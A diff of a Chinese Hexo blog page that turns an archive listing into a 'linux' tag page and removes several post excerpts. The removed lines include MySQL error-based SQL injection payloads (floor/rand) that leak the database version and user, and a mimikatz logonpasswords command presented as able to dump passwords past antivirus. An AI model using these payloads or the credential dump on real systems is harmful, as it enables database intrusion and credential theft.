@@ -7,7 +7,7 @@
     
 
     <title>
-      归档 
+      标签: linux 
     </title>
 
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -18,13 +18,13 @@
 
     <meta name="description" content="阳光明媚">
 <meta property="og:type" content="website">
-<meta property="og:title" content="归档">
-<meta property="og:url" content="http://hxcc.github.io/archives/index.html">
+<meta property="og:title" content="标签: linux">
+<meta property="og:url" content="http://hxcc.github.io/tags/linux/index.html">
 <meta property="og:site_name" content="Noaccess">
 <meta property="og:description" content="阳光明媚">
 <meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="归档">
+<meta name="twitter:title" content="标签: linux">
 <meta name="twitter:description" content="阳光明媚">
     
     
@@ -151,7 +151,8 @@ classes that you can use:
             
 
 
-   <!-- do nothing -->
+  <h1 class="archive-title">标签: linux</h1>
+  <hr class="post-list__divider" />
 
 
 <div class="main-post-list">
@@ -215,94 +216,6 @@ classes that you can use:
         
           <h2 id="系统清理更新"><a href="#系统清理更新" class="headerlink" title="系统清理更新"></a>系统清理更新</h2><p>安装完系统之后，需要更新一些补丁。Ctrl+Alt+T调出终端，执行一下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update </span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure></p>
 <h3 id="卸载libreOffice"><a href="#卸载libreOffice" class="headerlink" title="卸载libreOffice"></a>卸载libreOffice</h3><p>libreoffice事ubuntu自带的开源office软件，体验效果不如windows上的office，于是选择用WPS来替代（wps的安装后面会提到）<br>
-        
-      </div>
-
-      <hr class="post-list__divider" />
-    </li>
-    
-    <li>
-
-      <h2 class="post-list__post-title post-title">
-        <a href="/2017/01/20/ubuntu搭建ss服务/" title="link to ubuntu搭建ss服务">ubuntu搭建ss服务</a>
-      </h2>
-
-      <div class="post-list__meta">
-
-        <time datetime="2017-01-20" class="post-list__meta--date date">2017-01-20</time> 
-      </div>
-
-      <div class="excerpt">
-        
-          <p>ubuntu下搭建ss服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-pip</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure>
-<p>然后有俩种启动方式</p>
-<h3 id="1-命令行启动"><a href="#1-命令行启动" class="headerlink" title="1.命令行启动"></a>1.命令行启动</h3>
-        
-      </div>
-
-      <hr class="post-list__divider" />
-    </li>
-    
-    <li>
-
-      <h2 class="post-list__post-title post-title">
-        <a href="/2016/12/29/mysql显错注入/" title="link to mysql显错注入">mysql显错注入</a>
-      </h2>
-
-      <div class="post-list__meta">
-
-        <time datetime="2016-12-29" class="post-list__meta--date date">2016-12-29</time> 
-      </div>
-
-      <div class="excerpt">
-        
-          <h3 id="1、通过floor暴错"><a href="#1、通过floor暴错" class="headerlink" title="1、通过floor暴错"></a>1、通过floor暴错</h3><p>/<em>数据库版本</em>/<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (select concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>))) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
-/*简单办法暴库*/
-<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">id</span>=info()</span><br></pre></td></tr></table></figure><br>/<em>连接用户</em>/<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (select concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>))) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
-/*连接数据库*/
-        
-      </div>
-
-      <hr class="post-list__divider" />
-    </li>
-    
-    <li>
-
-      <h2 class="post-list__post-title post-title">
-        <a href="/2016/12/28/minikatz绕过杀软/" title="link to minikatz">minikatz</a>
-      </h2>
-
-      <div class="post-list__meta">
-
-        <time datetime="2016-12-28" class="post-list__meta--date date">2016-12-28</time> 
-      </div>
-
-      <div class="excerpt">
-        
-          <h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords full<span class="string">""</span> <span class="built_in">exit</span> &gt;&gt; log.txt</span><br></pre></td></tr></table></figure>
-<p>minikatz具有绕过杀软dump用户密码的能力</p>
-<h3 id="绕过杀软"><a href="#绕过杀软" class="headerlink" title="绕过杀软"></a>绕过杀软</h3>
-        
-      </div>
-
-      <hr class="post-list__divider" />
-    </li>
-    
-    <li>
-
-      <h2 class="post-list__post-title post-title">
-        <a href="/2016/12/15/使用hexo-Github搭建个人博客教程/" title="link to 使用hexo+Github搭建个人博客教程">使用hexo+Github搭建个人博客教程</a>
-      </h2>
-
-      <div class="post-list__meta">
-
-        <time datetime="2016-12-15" class="post-list__meta--date date">2016-12-15</time> 
-      </div>
-
-      <div class="excerpt">
-        
-          感谢k3vi大神帮助，此文转自http://www.k3vi.xyz
         
       </div>
 
